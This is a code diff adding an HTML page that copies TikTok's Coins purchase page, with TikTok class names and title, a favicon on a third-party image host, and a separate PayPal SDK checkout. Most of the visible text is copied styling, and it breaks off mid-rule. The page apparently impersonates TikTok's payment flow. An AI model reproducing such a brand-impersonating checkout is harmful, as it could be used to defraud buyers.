@@ -1,0 +1,738 @@
+<html><head><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style><script defer="defer" src="/static/js/main.fe7ca867.js"></script><link href="/static/css/main.e6c13ad2.css" rel="stylesheet"><style>élément{height:100%;min-height:100%}html body{overflow-y:auto}body{font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-size:14px;color:#161823;background-color:#fff;overscroll-behavior:contain;direction:ltr}body{min-height:100vh;text-rendering:optimizespeed;line-height:1.5}blockquote,body,dd,dl,figure,h1,h2,h3,h4,p{margin:0}*,::after,::before{box-sizing:border-box;user-select:unset}.tiktok-t31vku-MainLiveLayoutContainer{width:100%;height:100vh}.tiktok-xk7ai4-DivHeaderContainer{display:flex;justify-content:space-around;box-shadow:rgba(0,0,0,.12) 0 1px 1px;height:60px;width:100%;top:0;position:fixed;-moz-box-align:center;align-items:center;background:#fff;z-index:1000}.tiktok-1gd9bb4-DivHeaderWrapperMain{width:100%;display:flex;height:100%;flex-direction:row;-moz-box-pack:justify;justify-content:space-between;-moz-box-align:center;align-items:center;max-width:1150px;padding-right:24px;padding-left:20px}.tiktok-oteyea-DivLeftContainer{display:flex;flex-direction:row;-moz-box-align:center;align-items:center}.tiktok-dx28vs-SpanHamburgerContainer{width:38px;height:38px;position:relative;cursor:pointer;z-index:99;display:none}.tiktok-1g7ql4c-SpanHamburgerWrapper{height:200%;box-sizing:border-box;background:0 0;display:flex;flex-direction:column;-moz-box-pack:justify;justify-content:space-between;padding:24px 0;transform:scale(.5);transform-origin:center top 0px}.tiktok-5eteof-SpanHamburgerPath{box-sizing:border-box;height:3px;border-radius:4px;background-color:#000}.tiktok-ojnv26-StyledLink-StyledLinkLogo{font-size:0px}.tiktok-1x100u9-DivHeaderCenterContainer{position:relative}.tiktok-1asq5wp-DivSearchFormContainer{position:relative}.tiktok-dhqzc6-FormElement{display:flex;flex-direction:row;-moz-box-align:center;align-items:center;padding:12px 16px;background:rgba(22,24,35,.06);border-radius:92px;position:relative;overflow:hidden;z-index:1;margin:0}.tiktok-u4se1t-InputElement{font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:400;font-size:16px;line-height:21px;letter-spacing:.03px;border:medium none;background:0 0;outline:0;padding:0;width:100%;color:#161823;caret-color:rgb(254,44,85);appearance:textfield}.tiktok-hck1rr-SpanSpliter{width:1px;height:28px;margin:-3px 0;background:rgba(22,24,35,.12)}.tiktok-16dy42q-ButtonSearch{padding:11px 16px 11px 12px;margin:-12px -16px -12px 0;font-size:0px;cursor:pointer;outline:0;border:medium none;background:0 0}.tiktok-17iic05-DivSearchIconContainer{outline:0}.tiktok-u4se1t-InputElement~.e14ntknm1{display:none}.tiktok-1mdii59-DivInputBorder{display:none;position:absolute;inset:0px;border:1px solid rgba(22,24,35,.2);border-radius:92px;z-index:-1}.tiktok-q8q040-DivHeaderRightContainer{display:flex;flex-direction:row;align-items:center;position:relative}.tiktok-szsi1x-DivUploadContainer{margin-left:0;position:relative;height:36px;text-decoration:none}.tiktok-2gvzau-ALink-StyledLink{display:block;text-decoration:none}.tiktok-1qup28j-DivUpload{min-width:110px;padding:0 16px;height:36px;border:1px solid rgba(22,24,35,.12);border-radius:2px;display:flex;align-items:center;justify-content:center;background:#fff;text-decoration:none}.tiktok-qeydvm-StyledPlusIcon{height:20px;width:20px;margin-right:8px;color:#000;text-decoration:none}.tiktok-y3rt08-SpanUploadText{font-style:normal;font-weight:600;font-size:16px;text-decoration:none;color:#000}.tiktok-9j9jz0-DivMessageIconContainer{margin-left:16px;cursor:pointer;height:32px;padding:3px 3px 0;position:relative}.tiktok-y48l9g-StyledIcon{width:26px;height:26px;transform:none;color:#000}.tiktok-1deszxq-DivHeaderInboxContainer{margin-left:16px;position:relative}.tiktok-1g0p6jv-StyledInboxIcon{cursor:pointer;display:block}.tiktok-1idvj23-DivHeaderInboxWrapper{display:none;position:absolute;width:376px;height:640px;top:45px;background:#fff;border-radius:8px;box-shadow:rgba(0,0,0,.12) 0 -4px 32px;transition:all .2s linear 0s;z-index:1000;opacity:0;right:-66px}.tiktok-e0rxz1-StyledArrow{position:absolute;top:-8px;right:70px}.tiktok-vubwh3-DivInboxContainer{height:100%;display:flex;flex-direction:column}.tiktok-19hvf92-DivInboxHeaderContainer{padding-top:24px;flex:0 0 auto;padding-left:16px}.tiktok-fxwr5e-H2InboxTitle{color:#161823;font-family:TikTokDisplayFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:24px;line-height:30px;display:flex}.tiktok-10apsbc-DivGroupContainer{color:#161823;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:600;font-size:14px;line-height:18px;letter-spacing:.093px;margin-top:16px;display:flex;flex-flow:row wrap}.tiktok-15iwytd-DivProfileContainer{margin-left:24px;position:relative;width:32px;height:32px;background:center center/cover no-repeat;background-image:none;border-radius:50%;cursor:pointer}.tiktok-1qjl7qr-DivMainContainer{width:100%;display:flex;flex-direction:column;margin-top:60px;-moz-box-pack:center;justify-content:center;-moz-box-align:center;align-items:center;padding:24px 0;position:relative}.tiktok-lp888x-DivContentContainer{box-sizing:border-box;width:calc(100% - 144px);min-width:400px;height:100%;border-radius:8px;padding:32px 0}.tiktok-18xp9s9-SectionContentWrapper{width:100%;position:relative}.tiktok-k58u1v-DivTitleInfoContainer{width:100%;height:24px;display:flex;-moz-box-pack:justify;justify-content:space-between}.tiktok-12970u9-H1TitleInfoCoin{color:#161823;font-family:"Gill Sans",sans-serif;font-weight:700;font-size:24px;line-height:28px;margin:0}.tiktok-9jfqt5-StyledTransactionHistoryLink{color:#161823;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:16px;letter-spacing:.03px;text-decoration:none;line-height:22px}.tiktok-krn24s-DivProfileAndBannerRow{display:flex;margin-top:20px;-moz-box-pack:justify;justify-content:space-between;-moz-box-align:stretch;align-items:stretch;gap:8px}.tiktok-d2sjra-DivProfileInfo{max-width:100%;min-width:255px;width:max-content;height:76px;padding:16px 20px;display:flex;opacity:.8;-moz-box-pack:start;place-content:center flex-start;background:rgba(22,24,35,.03);border-radius:4px}.tiktok-15iwytd-DivProfileContainer{margin-left:24px;position:relative;width:32px;height:32px;background:center center/cover no-repeat;background-image:none;border-radius:50%;cursor:pointer}.tiktok-9l16e2-DivNameCoinInfo{display:flex;flex-direction:column;margin-left:12px;padding-right:20px;min-width:0}.tiktok-1uiqlhf-SpanNameInfo{color:#161823;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;letter-spacing:-.028px;font-size:18px;overflow:hidden;text-overflow:ellipsis;line-height:1.5}.tiktok-6vx15k-DivCoinInfo{display:flex;align-content:center;height:18px}.tiktok-908odc-StyledCoinIcon{width:18px;height:18px}.tiktok-1bro1iw-SpanCoinNum{color:rgba(22,24,35,.5);font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-size:14px;line-height:18px;letter-spacing:.093px;height:18px;display:inline-flex;-moz-box-align:center;align-items:center;margin-left:4px}.tiktok-1jtww57-DivRechargeCoins{font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:18px;letter-spacing:-.028px;margin-top:16px;line-height:1.2}.tiktok-z95cm-SpanContentContainer{width:100%}.tiktok-o49lq0-DivRechargeAdvantageInfo{font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:18px;line-height:24px;letter-spacing:-.028px;display:inline-block;margin-top:12px;color:#fe2c55}.tiktok-1rwkvc8-SpanRechargeTitle{color:#161823}.tiktok-1lfugd2-DivExplanationContainer{display:inline-block;padding:0 4px;cursor:pointer}.tiktok-n2pfir-StyledExclamationMarkCircleIcon{width:14px;height:14px;vertical-align:middle;color:rgba(22,24,35,.34)}.tiktok-1un7bi9-DivCoinsBkgContainer{margin:12px 0 10px}.tiktok-1a7iizi-OlCoinsListContainer{padding:0;margin:0;list-style-type:none;width:100%;position:relative;display:grid;grid-template-columns:repeat(auto-fit,219px);gap:24px;-moz-box-pack:justify;justify-content:space-between}.tiktok-1xsxoj2-ButtonContainer{width:100%;min-height:96px;position:relative;display:flex;flex-direction:column;-moz-box-align:center;align-items:center;-moz-box-pack:center;justify-content:center;padding:17px 2px 15px;border-radius:4px;border:2px solid #face15;cursor:pointer;pointer-events:initial;opacity:1;background-color:transparent}.tiktok-16jd2dh-DivNumContainer{height:32px;display:flex;-moz-box-align:center;align-items:center}.tiktok-240y52-SpanNumIcon{height:32px}.tiktok-kkwvro-StyledCoinIcon{width:32px;height:32px}.tiktok-10lqs59-SpanNumDisplay{font-family:TikTokDisplayFont,Arial,Tahoma,PingFangSC,sans-serif;font-size:24px;letter-spacing:.24px;line-height:1.2;display:inline-block;color:#161823;vertical-align:middle;margin-left:8px;margin-right:0;font-weight:700}.tiktok-1uetk1w-DivTextContainer{height:20px;margin-top:8px;display:flex}.tiktok-hpayk8-SpanTextNow{font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:14px;letter-spacing:.093px;color:rgba(22,24,35,.5);text-align:center;line-height:1.1}.tiktok-l4v9n8-ButtonContainer{width:100%;min-height:96px;position:relative;display:flex;flex-direction:column;-moz-box-align:center;align-items:center;-moz-box-pack:center;justify-content:center;padding:18px 2px 16px;border-radius:4px;border:1px solid rgba(22,24,35,.12);cursor:pointer;pointer-events:initial;opacity:1;background-color:transparent}.tiktok-16jd2dh-DivNumContainer{height:32px;display:flex;-moz-box-align:center;align-items:center}.tiktok-240y52-SpanNumIcon{height:32px}.tiktok-kkwvro-StyledCoinIcon{width:32px;height:32px}.tiktok-10lqs59-SpanNumDisplay{font-family:TikTokDisplayFont,Arial,Tahoma,PingFangSC,sans-serif;font-size:24px;letter-spacing:.24px;line-height:1.2;display:inline-block;color:#161823;vertical-align:middle;margin-left:8px;margin-right:0;font-weight:700}.tiktok-1uetk1w-DivTextContainer{height:20px;margin-top:8px;display:flex}.tiktok-hpayk8-SpanTextNow{font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:14px;letter-spacing:.093px;color:rgba(22,24,35,.5);text-align:center;line-height:1.1}.tiktok-11ddo6h-DivTotalContainer{width:100%}.tiktok-fbshyx-UlPaymentMethodsContainer{width:100%;margin:0 0 12px;display:flex;-moz-box-align:center;align-items:center;flex-wrap:wrap;gap:4px;padding:0;list-style-type:none}.tiktok-1sjzc7n-SpanTotalText{color:#161823;display:inline-block;margin-right:2px;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-size:16px;line-height:21px;letter-spacing:.03px}.tiktok-1quc8c-ImgPaymentIcon{width:22px;height:14px}.tiktok-1fguu8v-DivTotalContainer{width:100%;display:flex;-moz-box-align:center;align-items:center}.tiktok-b8ii2p-SpanTotalText{color:#161823;display:inline-block;margin-right:6px;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-size:16px;line-height:21px;letter-spacing:.03px}.tiktok-3m60iy-SpanTotalMount{color:#161823;margin-left:8px;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:16px;line-height:21px;letter-spacing:.03px}.tiktok-vr1v8s-DivButtonContainer{width:100%;margin-top:24px}.tiktok-174cudu-Button-StyledBuyButton{border-radius:4px;border:medium none;color:#fff;background-color:#fe2c55;min-height:36px;display:flex;position:relative;-moz-box-align:center;align-items:center;-moz-box-pack:center;justify-content:center;padding:6px 8px;user-select:none;cursor:pointer;box-sizing:border-box;font-family:TikTokFont,Arial,Tahoma,PingFangSC,sans-serif;font-weight:700;font-size:16px;line-height:21px;letter-spacing:.03px;margin-left:0;min-width:100px;width:200px;height:46px}.tiktok-1l1fdho-ButtonQuestionContainer{border:1px solid rgba(22,24,35,.12);background:#fff;outline:0;position:fixed;inset-inline-end:24px;bottom:24px;padding:10px;min-width:48px;width:48px;height:48px;box-shadow:rgba(0,0,0,.06) 0 2px 8px;border-radius:48px;cursor:pointer;line-height:24px;text-align:center;white-space:nowrap}.tiktok-ze008l-StyledQnMarkIcon{width:24px;height:24px}.tiktok-rp4zg0-SecureTextContainer{display:flex;-webkit-box-align:center;align-items:center}:root{--tux-fontFamilyHeading:'TikTokDisplayFont',Arial,Tahoma,PingFangSC,sans-serif;--tux-fontFamilyParagraph:'TikTokFont',Arial,Tahoma,PingFangSC,sans-serif;--tux-fontWeightRegular:400;--tux-fontWeightSemibold:500;--tux-fontWeightBold:700;--tux-fontSizeH1:96px;--tux-fontSizeH2:72px;--tux-fontSizeH3:56px;--tux-fontSizeH4:48px;--tux-fontSizeH5:32px;--tux-fontSizeH6:24px;--tux-fontSizeH7:18px;--tux-fontSizeP1:24px;--tux-fontSizeP2:18px;--tux-fontSizeP3:16px;--tux-fontSizeP4:14px;--tux-fontSizeP5:12px}:root{--tux-boxShadowIcon:0 2px 12px 0 rgba(0, 0, 0, 0.12);--tux-boxShadowLayer:0 2px 8px 0 rgba(0, 0, 0, 0.06);--tux-boxShadowNotice:0 2px 12px 0 rgba(0, 0, 0, 0.12)}:root,[data-theme=light],[data-tux-theme=light]{--tux-colorPrimary:rgba(254, 44, 85, 1);--tux-colorPrimary-tint-4:rgba(244, 42, 82, 1);--tux-colorPrimary-tint-8:rgba(234, 40, 78, 1);--tux-colorPrimary-tint-12:rgba(224, 39, 75, 1);--tux-colorPrimary-opacity-0:rgba(254, 44, 85, 0);--tux-colorPrimary-opacity-4:rgba(254, 44, 85, 0.04);--tux-colorPrimary-opacity-8:rgba(254, 44, 85, 0.08);--tux-colorPrimary-opacity-12:rgba(254, 44, 85, 0.12);--tux-colorLink:rgba(254, 44, 85, 1);--tux-colorPrimary2:rgba(22, 24, 35, 1);--tux-colorTextPrimary:rgba(22, 24, 35, 1);--tux-colorTextSecondary:rgba(22, 24, 35, 0.75);--tux-colorTextTertiary:rgba(22, 24, 35, 0.5);--tux-colorTextQuaternary:rgba(22, 24, 35, 0.34);--tux-colorBGPrimary:rgba(255, 255, 255, 1);--tux-colorBGSecondary:rgba(255, 255, 255, 1);--tux-colorBGSecondary-tint-4:rgba(245, 245, 245, 1);--tux-colorBGSecondary-tint-8:rgba(235, 235, 235, 1);--tux-colorBGSecondary-tint-12:rgba(224, 224, 224, 1);--tux-colorBGSecondary-opacity-0:rgba(255, 255, 255, 0);--tux-colorBGSecondary-opacity-4:rgba(255, 255, 255, 0.04);--tux-colorBGSecondary-opacity-8:rgba(255, 255, 255, 0.08);--tux-colorBGSecondary-opacity-12:rgba(255, 255, 255, 0.12);--tux-colorBGTertiary:rgba(255, 255, 255, 1);--tux-colorBGQuaternary:rgba(255, 255, 255, 1);--tux-colorBGQuinary:rgba(255, 255, 255, 1);--tux-colorBGSecondary2:rgba(255, 255, 255, 1);--tux-colorBGTertiary2:rgba(255, 255, 255, 1);--tux-colorBGPlaceholderDefault:rgba(22, 24, 35, 0.06);--tux-colorBGPlaceholderOpaque:rgba(241, 241, 241, 1);--tux-colorBGInput:rgba(22, 24, 35, 0.06);--tux-colorBGInput2:rgba(22, 24, 35, 0.06);--tux-colorBGView:rgba(22, 24, 35, 0.03);--tux-colorBGCreation3:rgba(248, 248, 248, 1);--tux-colorBGCreation4:rgba(255, 255, 255, 1);--tux-colorBGHover:rgba(22, 24, 35, 0.06);--tux-colorBGBrand:rgba(254, 44, 85, 0.06);--tux-colorLinePrimary:rgba(22, 24, 35, 0.2);--tux-colorLineSecondary:rgba(22, 24, 35, 0.12);--tux-colorLineInput:rgba(22, 24, 35, 0.5);--tux-colorLinePrimary2:rgba(22, 24, 35, 0.2);--tux-colorLineSecondary2:rgba(22, 24, 35, 0.12);--tux-colorLineSecondary3:rgba(22, 24, 35, 0.12);--tux-colorLineDarker:rgba(22, 24, 35, 0.12);--tux-colorSDSecondary:rgba(0, 0, 0, 0.5);--tux-colorSDTertiary:rgba(0, 0, 0, 0.2)}:root{--tux-colorPositive:rgba(11, 224, 155, 1);--tux-colorNegative:rgba(255, 76, 58, 1);--tux-colorToastDefault:rgba(84, 84, 84, 0.92);--tux-colorToastNegative:rgba(255, 76, 58, 0.92);--tux-colorSecondary:rgba(32, 213, 236, 1);--tux-colorSecondary2:rgba(16, 162, 197, 1);--tux-colorPositive2:rgba(79, 171, 126, 1);--tux-colorConstTextInverse:rgba(255, 255, 255, 1);--tux-colorConstTextInverse2:rgba(255, 255, 255, 0.9);--tux-colorConstTextInverse3:rgba(255, 255, 255, 0.75);--tux-colorConstTextInverse4:rgba(255, 255, 255, 0.5);--tux-colorConstTextInverse5:rgba(255, 255, 255, 0.34);--tux-colorConstTextPrimary:rgba(22, 24, 35, 1);--tux-colorConstBGInverse:rgba(0, 0, 0, 1);--tux-colorConstBGInverse2:rgba(0, 0, 0, 0.6);--tux-colorConstBGInverse3:rgba(37, 37, 37, 0.6);--tux-colorConstBGInverse4:rgba(84, 84, 84, 0.5);--tux-colorBGCreation:rgba(0, 0, 0, 1);--tux-colorBGCreation2:rgba(27, 27, 27, 1);--tux-colorBGCreation5:rgba(0, 0, 0, 0.15);--tux-colorConstBGMat:rgba(255, 255, 255, 0.2);--tux-colorConstBGContainer:rgba(255, 255, 255, 0.12);--tux-colorConstBGContainer2:rgba(255, 255, 255, 0.08);--tux-colorConstBGContainer3:rgba(255, 255, 255, 0.04);--tux-colorConstBGPlaceholderOpaque:rgba(241, 241, 241, 1);--tux-colorConstBGInverseOpaque:rgba(37, 37, 37, 1);--tux-colorConstBGInverse1:rgba(56, 56, 56, 0.95);--tux-colorConstLineInverse:rgba(255, 255, 255, 0.2);--tux-colorConstLineInverse2:rgba(255, 255, 255, 0.12);--tux-colorSDPrimary:rgba(0, 0, 0, 0.8);--tux-gradientLive:linear-gradient(131.17deg, #ff1764 0%, #ed3495 94.15%);--tux-gradientVideoCoverOverlay:linear-gradient(180deg, rgba(22, 24, 35, 0.0001) 2.92%, rgba(22, 24, 35, 0.5) 98.99%);--tux-colorAssistColorYellow:rgba(250, 206, 21, 1)}*,::after,::before{box-sizing:border-box;user-select:unset}*,::after,::before{box-sizing:border-box;user-select:unset}html ::-webkit-scrollbar{border-radius:0;width:8px}html ::-webkit-scrollbar-thumb{border-radius:4px;background-color:rgba(22,24,35,.06)}html ::-webkit-scrollbar-track{border-radius:0;background-color:rgba(0,0,0,0)}.tiktok-1nnmv9n-TextContainer{box-sizing:border-box;margin-block:0px;color:var(--tux-colorPositive2)}.tiktok-1gu77br-TextContainer{box-sizing:border-box;margin-block:0px;font-size:var(--tux-fontSizeP5);line-height:1.5;font-family:var(--tux-fontFamilyParagraph);font-weight:var(--tux-fontWeightRegular);color:var(--tux-colorPositive2)}</style><title>TikTok Coins: Buy and recharge Coins to send Gifts | TikTok</title><link href="https://i.ibb.co/Nrr4Qx9/unnamed.webp" rel="icon" type="image/ico"><link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" rel="stylesheet"><link href="https://cdn.oaistatic.com/_next/static/media/apple-touch-icon.59f2e898.png" rel="icon" sizes="180x180"><script crossorigin="anonymous" integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"></script><link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" referrerpolicy="no-referrer" rel="stylesheet"><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script><link href="/manifest.json" rel="manifest"><script data-uid-auto="uid_xhpjsuvhfdqgukkiscvpndnfsifvrb" src="https://www.paypal.com/sdk/js?client-id=AddX0uRUNvGUXVrsrHOBETqen7LNYWykr8b2V3z0N8kyPAPXTi4nOFcuZR3tvR9j4X1bVDq2rDKnxBQQ&amp;components=buttons"></script><style>
+#orderSummaryModal .modal-dialog {
+    max-width: 600px;
+    margin: 1.75rem auto;
+}
+</style><style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.immersive-translate-attach-loading::after {
+  content: " ";
+
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-2000%, -50%);
+  z-index: 100;
+}
+
+.immersive-translate-loading-spinner {
+  vertical-align: middle !important;
+  width: 10px !important;
+  height: 10px !important;
+  display: inline-block !important;
+  margin: 0 4px !important;
+  border: 2px rgba(221, 244, 255, 0.6) solid !important;
+  border-top: 2px rgba(0, 0, 0, 0.375) solid !important;
+  border-left: 2px rgba(0, 0, 0, 0.375) solid !important;
+  border-radius: 50% !important;
+  padding: 0 !important;
+  -webkit-animation: immersive-translate-loading-animation 0.6s infinite linear !important;
+  animation: immersive-translate-loading-animation 0.6s infinite linear !important;
+}
+
+@-webkit-keyframes immersive-translate-loading-animation {
+  from {
+    -webkit-transform: rotate(0deg);
+  }
+
+  to {
+    -webkit-transform: rotate(359deg);
+  }
+}
+
+@keyframes immersive-translate-loading-animation {
+  from {
+    transform: rotate(0deg);
+  }
+
+  to {
+    transform: rotate(359deg);
+  }
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0),
+      0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0),
+      0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color),
+      0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color),
+      100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color),
+      110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color),
+      120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0),
+      130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0),
+      200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0),
+      200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+
+.immersive-translate-toast {
+  display: flex;
+  position: fixed;
+  z-index: 2147483647;
+  left: 0;
+  right: 0;
+  top: 1%;
+  width: fit-content;
+  padding: 12px 20px;
+  margin: auto;
+  overflow: auto;
+  background: #fef6f9;
+  box-shadow: 0px 4px 10px 0px rgba(0, 10, 30, 0.06);
+  font-size: 15px;
+  border-radius: 8px;
+  color: #333;
+}
+
+.immersive-translate-toast-content {
+  display: flex;
+  flex-direction: row;
+  align-items: center;
+}
+
+.immersive-translate-toast-hidden {
+  margin: 0 20px 0 72px;
+  text-decoration: underline;
+  cursor: pointer;
+}
+
+.immersive-translate-toast-close {
+  color: #666666;
+  font-size: 20px;
+  font-weight: bold;
+  padding: 0 10px;
+  cursor: pointer;
+}
+
+@media screen and (max-width: 768px) {
+  .immersive-translate-toast {
+    top: 0;
+    padding: 12px 0px 0 10px;
+  }
+  .immersive-translate-toast-content {
+    flex-direction: column;
+    text-align: center;
+  }
+  .immersive-translate-toast-hidden {
+    margin: 10px auto;
+  }
+}
+
+.immersive-translate-dialog {
+  position: fixed;
+  z-index: 2147483647;
+  left: 0;
+  top: 0;
+  display: flex;
+  width: 300px;
+  flex-direction: column;
+  align-items: center;
+  font-size: 15px;
+  left: 0;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  margin: auto;
+  height: fit-content;
+  border-radius: 20px;
+  background-color: #fff;
+}
+
+.immersive-translate-modal {
+  display: none;
+  position: fixed;
+  z-index: 2147483647;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  overflow: auto;
+  background-color: rgb(0, 0, 0);
+  background-color: rgba(0, 0, 0, 0.4);
+  font-size: 15px;
+}
+
+.immersive-translate-modal-content {
+  background-color: #fefefe;
+  margin: 10% auto;
+  padding: 40px 24px 24px;
+  border-radius: 12px;
+  width: 350px;
+  font-family: system-ui, -apple-system, "Segoe UI", "Roboto", "Ubuntu",
+    "Cantarell", "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji",
+    "Segoe UI Symbol", "Noto Color Emoji";
+  position: relative;
+}
+
+@media screen and (max-width: 768px) {
+  .immersive-translate-modal-content {
+    margin: 25% auto !important;
+  }
+}
+
+@media screen and (max-width: 480px) {
+  .immersive-translate-modal-content {
+    width: 80vw !important;
+    margin: 20vh auto !important;
+    padding: 20px 12px 12px !important;
+  }
+
+  .immersive-translate-modal-title {
+    font-size: 14px !important;
+  }
+
+  .immersive-translate-modal-body {
+    font-size: 13px !important;
+    max-height: 60vh !important;
+  }
+
+  .immersive-translate-btn {
+    font-size: 13px !important;
+    padding: 8px 16px !important;
+    margin: 0 4px !important;
+  }
+
+  .immersive-translate-modal-footer {
+    gap: 6px !important;
+    margin-top: 16px !important;
+  }
+}
+
+.immersive-translate-modal .immersive-translate-modal-content-in-input {
+  max-width: 500px;
+}
+.immersive-translate-modal-content-in-input .immersive-translate-modal-body {
+  text-align: left;
+  max-height: unset;
+}
+
+.immersive-translate-modal-title {
+  text-align: center;
+  font-size: 16px;
+  font-weight: 700;
+  color: #333333;
+}
+
+.immersive-translate-modal-body {
+  text-align: center;
+  font-size: 14px;
+  font-weight: 400;
+  color: #333333;
+  margin-top: 24px;
+  word-break: break-all;
+}
+
+@media screen and (max-width: 768px) {
+  .immersive-translate-modal-body {
+    max-height: 250px;
+    overflow-y: auto;
+  }
+}
+
+.immersive-translate-close {
+  color: #666666;
+  position: absolute;
+  right: 16px;
+  top: 16px;
+  font-size: 20px;
+  font-weight: bold;
+}
+
+.immersive-translate-close:hover,
+.immersive-translate-close:focus {
+  text-decoration: none;
+  cursor: pointer;
+}
+
+.immersive-translate-modal-footer {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  margin-top: 24px;
+}
+
+.immersive-translate-btn {
+  width: fit-content;
+  color: #fff;
+  background-color: #ea4c89;
+  border: none;
+  font-size: 14px;
+  margin: 0 8px;
+  padding: 9px 30px;
+  border-radius: 5px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+.immersive-translate-btn-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+
+.immersive-translate-btn:hover {
+  background-color: #f082ac;
+}
+.immersive-translate-btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+.immersive-translate-btn:disabled:hover {
+  background-color: #ea4c89;
+}
+
+.immersive-translate-link-btn {
+  background-color: transparent;
+  color: #ea4c89;
+  border: none;
+  cursor: pointer;
+  height: 30px;
+  line-height: 30px;
+}
+
+.immersive-translate-cancel-btn {
+  /* gray color */
+  background-color: rgb(89, 107, 120);
+}
+
+.immersive-translate-cancel-btn:hover {
+  background-color: hsl(205, 20%, 32%);
+}
+
+.immersive-translate-action-btn {
+  background-color: transparent;
+  color: #ea4c89;
+  border: 1px solid #ea4c89;
+}
+
+.immersive-translate-btn svg {
+  margin-right: 5px;
+}
+
+.immersive-translate-link {
+  cursor: pointer;
+  user-select: none;
+  -webkit-user-drag: none;
+  text-decoration: none;
+  color: #ea4c89;
+  -webkit-tap-highlight-color: rgba(0, 0, 0, 0.1);
+}
+
+.immersive-translate-primary-link {
+  cursor: pointer;
+  user-select: none;
+  -webkit-user-drag: none;
+  text-decoration: none;
+  color: #ea4c89;
+  -webkit-tap-highlight-color: rgba(0, 0, 0, 0.1);
+}
+
+.immersive-translate-modal input[type="radio"] {
+  margin: 0 6px;
+  cursor: pointer;
+}
+
+.immersive-translate-modal label {
+  cursor: pointer;
+}
+
+.immersive-translate-close-action {
+  position: absolute;
+  top: 2px;
+  right: 0px;
+  cursor: pointer;
+}
+
+.imt-image-status {
